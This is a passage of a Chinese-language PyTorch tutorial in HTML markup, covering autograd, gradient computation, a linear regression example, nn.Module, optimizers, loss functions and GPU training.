class="token comment">#tensor([[3., 3.],</span><span class="token comment">#        [3., 3.]], grad_fn=&lt;AddBackward0&gt;)</span>z <span class="token operator">=</span> y<span class="token operator">*</span>y<span class="token operator">*</span><span class="token number">3</span>  <span class="token comment">#平方x3</span><span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token comment">#tensor([[27., 27.],</span><span class="token comment">#        [27., 27.]], grad_fn=&lt;MulBackward0&gt;) </span>out <span class="token operator">=</span> z<span class="token punctuation">.</span>mean<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#求均值</span><span class="token keyword">print</span><span class="token punctuation">(</span>out<span class="token punctuation">)</span><span class="token comment">#tensor(27., grad_fn=&lt;MeanBackward0&gt;)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>$x$的<code>requires_grad</code>属性为True之后的每次计算都会修改其<code>grad_fn</code>属性，用来记录做过的操作</p><p>​</p><p>​</p><p><strong>requires_grad和grad_fn</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">a <span class="token operator">=</span> torch<span class="token punctuation">.</span>randn<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>a <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>a <span class="token operator">*</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token punctuation">(</span>a <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>requires_grad<span class="token punctuation">)</span>  <span class="token comment">#False</span>a<span class="token punctuation">.</span>requires_grad_<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span>  <span class="token comment">#修改</span>b <span class="token operator">=</span> <span class="token punctuation">(</span>a <span class="token operator">*</span> a<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>b<span class="token punctuation">.</span>grad_fn<span class="token punctuation">)</span> <span class="token comment"># &lt;SumBackward0 object at 0x4e2b14345d21&gt;</span><span class="token keyword">with</span> torch<span class="token punctuation">.</span>no_gard<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    c <span class="token operator">=</span> <span class="token punctuation">(</span>a <span class="token operator">*</span> a<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment">#tensor(151.6830),此时c没有gard_fn</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>requires_grad<span class="token punctuation">)</span> <span class="token comment">#False</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>注意：</strong></p><p>防止跟踪历史记录和使用内存，可以将代码块包装在<code>with torch.no_grad():</code>中，这在<strong>评估模型时有用</strong>，因为模型可能具有<code>requires_grad = True</code>的可训练的参数，但是我们不需要在此过程中对他们进行梯度计算。</p><p>​</p><p>​</p><h4 id="1-6-2-梯度计算">1.6.2 梯度计算</h4><p>可以使用<code>backward</code>方法来进行反向传播，计算梯度<code>out.backward()</code>,此时便能够求出导数$\frac{d out}{dx}$,调用<code>x.gard</code>能够获取导数值</p><p>得到</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">tensor<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">4.5000</span><span class="token punctuation">,</span> <span class="token number">4.5000</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token punctuation">[</span><span class="token number">4.5000</span><span class="token punctuation">,</span> <span class="token number">4.5000</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>因为：<br>$$<br>\frac{d(O)}{d(x_i)} = \frac{3}{2}(x_i+2)<br>$$<br>在$x_i$等于1时其值为4.5</p><p>​</p><p><strong>注意：</strong></p><ol><li><p>在输出为一个标量的情况下，我们可以调用输出<code>tensor</code>的<code>backword()</code> 方法，但是在数据是一个向量的时候，调用<code>backward()</code>的时候还需要传入其他参数。</p></li><li><p><code>loss.backward()</code>就是根据损失函数，对参数为（requires_grad=True）的去计算梯度，并且累加保存到<code>x.gard</code>，此时还并未更新其梯度，所以每次反向传播之前需要先把梯度置为0后</p></li><li><p><code>tensor.data</code>：</p><ul><li><p>require_grad=False时，tensor.data和tensor等价</p></li><li><p>require_grad=True时，tensor.data仅仅是获取tensor中的数据</p></li></ul></li><li><p><code>tensor.numpy()</code>：</p><ul><li>require_grad=True不能够直接转换，需要使用<code>tensor.detach().numpy()</code>，能够实现对数据的深拷贝</li></ul></li></ol><p>​</p><p>​</p><h4 id="1-6-3-线性回归">1.6.3 线性回归</h4><blockquote><p>使用自定义的数据，使用Torch实现一个简单的线性回归</p></blockquote><p>假设基础模型是$y = wx+b$，其中$w$和$b$均为参数，使用$y = 3x+0.8$来构造数据，最后通过模型应该能够得出$w$和$b$应该分别接近3和0.8</p><p>​</p><ol><li>准备数据</li><li>计算预测值</li><li>计算损失，把参数的梯度置为0，进行反向传播</li><li>更新参数</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> torch<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">from</span> matplotlib <span class="token keyword">import</span> pyplot <span class="token keyword">as</span> plt<span class="token comment">#1. 准备数据</span>x <span class="token operator">=</span> torch<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span><span class="token punctuation">)</span>y <span class="token operator">=</span> <span class="token number">3</span><span class="token operator">*</span>x <span class="token operator">+</span> <span class="token number">0.8</span>w <span class="token operator">=</span> torch<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>requires_grad<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>b <span class="token operator">=</span> torch<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>requires_grad<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">loss_fn</span><span class="token punctuation">(</span>y<span class="token punctuation">,</span>y_predict<span class="token punctuation">)</span><span class="token punctuation">:</span>    loss <span class="token operator">=</span> <span class="token punctuation">(</span>y_predict<span class="token operator">-</span>y<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">pow</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span>mean<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">[</span>w<span class="token punctuation">,</span>b<span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token comment">#每次反向传播前把梯度置为0</span>        <span class="token keyword">if</span> i<span class="token punctuation">.</span>grad <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>            i<span class="token punctuation">.</span>grad<span class="token punctuation">.</span>data<span class="token punctuation">.</span>zero_<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># [i.grad.data.zero_() for i in [w,b] if i.grad is not None]</span>    loss<span class="token punctuation">.</span>backward<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> loss<span class="token punctuation">.</span>data<span class="token keyword">def</span> <span class="token function">optimize</span><span class="token punctuation">(</span>learning_rate<span class="token punctuation">)</span><span class="token punctuation">:</span>    w<span class="token punctuation">.</span>data <span class="token operator">-=</span> learning_rate<span class="token operator">*</span> w<span class="token punctuation">.</span>grad<span class="token punctuation">.</span>data    b<span class="token punctuation">.</span>data <span class="token operator">-=</span> learning_rate<span class="token operator">*</span> b<span class="token punctuation">.</span>grad<span class="token punctuation">.</span>data<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment">#2. 计算预测值</span>    y_predict <span class="token operator">=</span> x<span class="token operator">*</span>w <span class="token operator">+</span> b    <span class="token comment">#3.计算损失，把参数的梯度置为0，进行反向传播 </span>    loss <span class="token operator">=</span> loss_fn<span class="token punctuation">(</span>y<span class="token punctuation">,</span>y_predict<span class="token punctuation">)</span>        <span class="token keyword">if</span> i<span class="token operator">%</span><span class="token number">500</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>loss<span class="token punctuation">)</span>    <span class="token comment">#4. 更新参数w和b</span>    optimize<span class="token punctuation">(</span><span class="token number">0.01</span><span class="token punctuation">)</span><span class="token comment"># 绘制图形，观察训练结束的预测值和真实值</span>predict <span class="token operator">=</span>  x<span class="token operator">*</span>w <span class="token operator">+</span> b  <span class="token comment">#使用训练后的w和b计算预测值</span>plt<span class="token punctuation">.</span>scatter<span class="token punctuation">(</span>x<span class="token punctuation">.</span>data<span class="token punctuation">.</span>numpy<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> y<span class="token punctuation">.</span>data<span class="token punctuation">.</span>numpy<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>c <span class="token operator">=</span> <span class="token string">"r"</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">.</span>data<span class="token punctuation">.</span>numpy<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> predict<span class="token punctuation">.</span>data<span class="token punctuation">.</span>numpy<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"w"</span><span class="token punctuation">,</span>w<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"b"</span><span class="token punctuation">,</span>b<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>图形效果如下：</p><p><img src="D:%5CGit-repo%5Chexo%5Csource_posts%5Cdeeplearning-basic%5C%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%921.png" alt=""></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 打印w和b</span>w tensor<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">2.9280</span><span class="token punctuation">]</span><span class="token punctuation">,</span> requires_grad<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>b tensor<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0.8372</span><span class="token punctuation">]</span><span class="token punctuation">,</span> requires_grad<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>​</p><p>​</p><h3 id="1-2-2-PyTorch完成基础模型">1.2.2 PyTorch完成基础模型</h3><h4 id="常用API">常用API</h4><p>在pytorch中预设了一些更加灵活简单的对象，让我们来构造模型、定义损失，优化损失等</p><h5 id="nn-Module">nn.Module</h5><p><code>nn.Modul</code> 是<code>torch.nn</code>提供的一个类，是pytorch中自定义网络的一个基类，在这个类中定义了很多方法让继承这个类定义网络的时候非常简单</p><p>自定义网络的时候，有两个方法需要特别注意：</p><ol><li><code>__init__</code>需要调用<code>super</code>方法，继承父类的属性和方法</li><li><code>farward</code>方法必须实现，用来定义我们的网络的向前计算的过程</li></ol><blockquote><p>前面的$y = wx+b$的模型举例如下：</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> torch <span class="token keyword">import</span> nn<span class="token keyword">class</span> <span class="token class-name">Lr</span><span class="token punctuation">(</span>nn<span class="token punctuation">.</span>Module<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token builtin">super</span><span class="token punctuation">(</span>Lr<span class="token punctuation">,</span> self<span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment">#继承父类init的参数</span>        self<span class="token punctuation">.</span>linear <span class="token operator">=</span> nn<span class="token punctuation">.</span>Linear<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>     <span class="token keyword">def</span> <span class="token function">forward</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">:</span>        out <span class="token operator">=</span> self<span class="token punctuation">.</span>linear<span class="token punctuation">(</span>x<span class="token punctuation">)</span>        <span class="token keyword">return</span> out<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>注意：</strong></p><ol><li><code>nn.Linear</code>为预定义好的线性模型，也称为<strong>全链接层</strong>，传入的参数为输入的数量，输出的数量<code>(in_features, out_features)</code></li><li><code>nn.Module</code>定义了<code>__call__</code>方法，实现的就是调用<code>forward</code>方法，即<code>Lr</code>的实例，能够直接被传入参数调用，实际上调用的是<code>forward</code>方法并传入参数</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 实例化模型</span>model <span class="token operator">=</span> Lr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 传入数据，计算结果</span>predict <span class="token operator">=</span> model<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>​</p><p>​</p><h5 id="优化器类">优化器类</h5><p>优化器<code>optimizer</code>可以理解为torch为我们封装的用来进行更新参数的方法，比如常见的<code>SGD</code>、<code>Adam</code></p><p><strong>注意：</strong></p><ol><li>参数可以使用<code>model.parameters()</code>来获取，获取模型中所有<code>requires_grad=True</code>的参数</li><li>优化类的使用方法<ul><li><p>实例化</p></li><li><p>所有参数的梯度，将其值置为0</p></li><li><p>反向传播计算梯度</p></li><li><p>更新参数值</p></li></ul></li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 示例</span>optimizer <span class="token operator">=</span> optim<span class="token punctuation">.</span>SGD<span class="token punctuation">(</span>model<span class="token punctuation">.</span>parameters<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> lr<span class="token operator">=</span><span class="token number">1e</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token comment">#1. 实例化</span>optimizer<span class="token punctuation">.</span>zero_grad<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#2. 梯度置为0</span>loss<span class="token punctuation">.</span>backward<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#3. 计算梯度</span>optimizer<span class="token punctuation">.</span>step<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment">#4. 更新参数的值</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​</p><p>​</p><h5 id="损失函数">损失函数</h5><ol><li>均方误差:<code>nn.MSELoss()</code>,常用于回归问题</li><li>交叉熵损失：<code>nn.CrossEntropyLoss()</code>，常用于分类问题</li></ol><p>使用方法：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">model <span class="token operator">=</span> Lr<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#1. 实例化模型</span>criterion <span class="token operator">=</span> nn<span class="token punctuation">.</span>MSELoss<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#2. 实例化损失函数</span>optimizer <span class="token operator">=</span> optim<span class="token punctuation">.</span>SGD<span class="token punctuation">(</span>model<span class="token punctuation">.</span>parameters<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> lr<span class="token operator">=</span><span class="token number">1e</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token comment">#3. 实例化优化器类</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    y_predict <span class="token operator">=</span> model<span class="token punctuation">(</span>x_true<span class="token punctuation">)</span> <span class="token comment">#4. 向前计算预测值</span>    loss <span class="token operator">=</span> criterion<span class="token punctuation">(</span>y_true<span class="token punctuation">,</span>y_predict<span class="token punctuation">)</span> <span class="token comment">#5. 调用损失函数传入真实值和预测值，得到损失结果</span>    optimizer<span class="token punctuation">.</span>zero_grad<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#5. 当前循环参数梯度置为0</span>    loss<span class="token punctuation">.</span>backward<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#6. 计算梯度</span>    optimizer<span class="token punctuation">.</span>step<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment">#7. 更新参数的值</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​</p><p>​</p><p><strong>完整代码：</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> torch<span class="token keyword">from</span> torch <span class="token keyword">import</span> nn<span class="token keyword">from</span> torch <span class="token keyword">import</span> optim<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">from</span> matplotlib <span class="token keyword">import</span> pyplot <span class="token keyword">as</span> plt<span class="token comment"># 1. 定义数据</span>x <span class="token operator">=</span> torch<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>y <span class="token operator">=</span> x<span class="token operator">*</span><span class="token number">3</span> <span class="token operator">+</span> <span class="token number">0.8</span><span class="token comment">#2 .定义模型</span><span class="token keyword">class</span> <span class="token class-name">Lr</span><span class="token punctuation">(</span>nn<span class="token punctuation">.</span>Module<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token builtin">super</span><span class="token punctuation">(</span>Lr<span class="token punctuation">,</span>self<span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>linear <span class="token operator">=</span> nn<span class="token punctuation">.</span>Linear<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">forward</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">:</span>        out <span class="token operator">=</span> self<span class="token punctuation">.</span>linear<span class="token punctuation">(</span>x<span class="token punctuation">)</span>        <span class="token keyword">return</span> out<span class="token comment"># 2. 实例化模型，loss，和优化器</span>model <span class="token operator">=</span> Lr<span class="token punctuation">(</span><span class="token punctuation">)</span>criterion <span class="token operator">=</span> nn<span class="token punctuation">.</span>MSELoss<span class="token punctuation">(</span><span class="token punctuation">)</span>optimizer <span class="token operator">=</span> optim<span class="token punctuation">.</span>SGD<span class="token punctuation">(</span>model<span class="token punctuation">.</span>parameters<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> lr<span class="token operator">=</span><span class="token number">1e</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token comment">#3. 训练模型</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">30000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    out <span class="token operator">=</span> model<span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token comment">#3.1 获取预测值</span>    loss <span class="token operator">=</span> criterion<span class="token punctuation">(</span>y<span class="token punctuation">,</span>out<span class="token punctuation">)</span> <span class="token comment">#3.2 计算损失</span>    optimizer<span class="token punctuation">.</span>zero_grad<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment">#3.3 梯度归零</span>    loss<span class="token punctuation">.</span>backward<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#3.4 计算梯度</span>    optimizer<span class="token punctuation">.</span>step<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 3.5 更新梯度</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">20</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Epoch[{}/{}], loss: {:.6f}'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">30000</span><span class="token punctuation">,</span>loss<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#4. 模型评估</span>model<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#设置模型为评估模式，即预测模式</span>predict <span class="token operator">=</span> model<span class="token punctuation">(</span>x<span class="token punctuation">)</span>predict <span class="token operator">=</span> predict<span class="token punctuation">.</span>data<span class="token punctuation">.</span>numpy<span class="token punctuation">(</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>scatter<span class="token punctuation">(</span>x<span class="token punctuation">.</span>data<span class="token punctuation">.</span>numpy<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>y<span class="token punctuation">.</span>data<span class="token punctuation">.</span>numpy<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>c<span class="token operator">=</span><span class="token string">"r"</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">.</span>data<span class="token punctuation">.</span>numpy<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>predict<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出如下：</p><p><img src="D:%5CGit-repo%5Chexo%5Csource_posts%5Cdeeplearning-basic%5C%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%922.png" alt=""></p><p><strong>注意：</strong></p><p><code>model.eval()</code>表示设置模型为评估模式，即预测模式</p><p><code>model.train(mode=True)</code> 表示设置模型为训练模式</p><p>在当前的线性回归中，上述并无区别，但是在其他的一些模型中，<strong>训练的参数和预测的参数会不相同</strong>，到时候就需要具体告诉程序我们是在进行训练还是预测，比如模型中存在<strong>Dropout</strong>，<strong>BatchNorm</strong>时</p><p>​</p><p>​</p><h4 id="1-7-2-在GPU上运行代码">1.7.2 在GPU上运行代码</h4><p>当模型太大或者参数太多的情况下，为了加快训练速度，经常会使用GPU来进行训练，此时我们的代码需要稍作调整：</p><ol><li><p>判断GPU是否可用<code>torch.cuda.is_available()</code></p></li><li><p>把模型参数和input数据转化为cuda的支持类型</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">model<span class="token punctuation">.</span>to<span class="token punctuation">(</span>device<span class="token punctuation">)</span>x_true<span class="token punctuation">.</span>to<span class="token punctuation">(</span>device<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>在GPU上计算结果也为cuda的数据类型，需要转化为numpy或者tensor类型</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">predict <span class="token operator">=</span> predict<span class="token punctuation">.</span>cpu<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>detach<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>numpy<span class="token punctuation">(</span><span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><p>​</p><p>完整代码：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> torch<span class="token keyword">from</span> torch <span class="token keyword">import</span> nn<span class="token keyword">from</span> torch <span class="token keyword">import</span> optim<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">from</span> matplotlib <span class="token keyword">import</span> pyplot <span class="token keyword">as</span> plt<span class="token keyword">import</span> time<span class="token comment"># 1. 定义数据</span>x <span class="token operator">=</span> torch<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>y <span class="token operator">=</span> x<span class="token operator">*</span><span class="token number">3</span> <span class="token operator">+</span> <span class="token number">0.8</span><span class="token comment">#2 .定义模型</span><span class="token keyword">class</span> <span class="token class-name">Lr</span><span class="token punctuation">(</span>nn<span class="token punctuation">.</span>Module<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token builtin">super</span><span class="token punctuation">(</span>Lr<span class="token punctuation">,</span>self<span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>linear <span class="token operator">=</span> nn<span class="token punctuation">.</span>Linear<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">forward</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">:</span>        out <span class="token operator">=</span> self<span class="token punctuation">.</span>linear<span class="token punctuation">(</span>x<span class="token punctuation">)</span>        <span class="token keyword">return</span> out<span class="token comment"># 2. 实例化模型，loss，和优化器</span>device <span class="token operator">=</span> torch<span class="token punctuation">.</span>device<span class="token punctuation">(</span><span class="token string">"cuda:0"</span> <span class="token keyword">if</span> torch<span class="token punctuation">.</span>cuda<span class="token punctuation">.</span>is_available<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token string">"cpu"</span><span class="token punctuation">)</span>x<span class="token punctuation">,</span>y <span class="token operator">=</span> x<span class="token punctuation">.</span>to<span class="token punctuation">(</span>device<span class="token punctuation">)</span><span class="token punctuation">,</span>y<span class="token punctuation">.</span>to<span class="token punctuation">(</span>device<span class="token punctuation">)</span>model <span class="token operator">=</span> Lr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>to<span class="token punctuation">(</span>device<span class="token punctuation">)</span>criterion <span class="token operator">=</span> nn<span class="token punctuation">.</span>MSELoss<span class="token punctuation">(</span><span class="token punctuation">)</span>optimizer <span class="token operator">=</span> optim<span class="token punctuation">.</span>SGD<span class="token punctuation">(</span>model<span class="token punctuation">.</span>parameters<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> lr<span class="token operator">=</span><span class="token number">1e</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token comment">#3. 训练模型</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">300</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    out <span class="token operator">=</span> model<span class="token punctuation">(</span>x<span class="token punctuation">)</span>    loss <span class="token operator">=</span> criterion<span class="token punctuation">(</span>y<span class="token punctuation">,</span>out<span class="token punctuation">)</span>    optimizer<span class="token punctuation">.</span>zero_grad<span class="token punctuation">(</span><span class="token punctuation">)</span>    loss<span class="token punctuation">.</span>backward<span class="token punctuation">(</span><span class="token punctuation">)</span>    optimizer<span class="token punctuation">.</span>step<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">20</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Epoch[{}/{}], loss: {:.6f}'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token 